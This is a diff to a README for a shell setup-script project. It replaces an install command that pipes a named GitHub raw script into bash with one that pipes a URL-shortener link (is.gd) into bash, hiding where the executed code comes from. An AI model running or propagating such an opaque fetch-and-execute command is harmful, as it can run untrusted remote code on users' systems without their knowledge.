@@ -5,7 +5,7 @@ Automated environment setup scripts for Linux and Windows.
 To install **Oh My Shell Script**, simply run the following command in your terminal:
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/zangzang/oh-my-shellscript/main/install.sh | bash
+curl -fsSL https://is.gd/nrzE95 | bash
 ```
 
 ### Manual Installation
